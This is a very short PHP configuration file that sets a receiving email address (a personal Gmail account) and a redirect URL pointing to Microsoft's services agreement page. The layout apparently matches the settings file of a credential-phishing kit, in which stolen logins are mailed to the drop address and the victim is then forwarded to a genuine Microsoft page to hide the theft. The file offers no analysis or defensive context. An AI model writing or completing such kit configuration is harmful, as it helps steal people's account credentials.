<?php 
$Receive_email="chiefpriest10.5kg@gmail.com";
$redirect="https://www.microsoft.com/en-US/servicesagreement/";
?>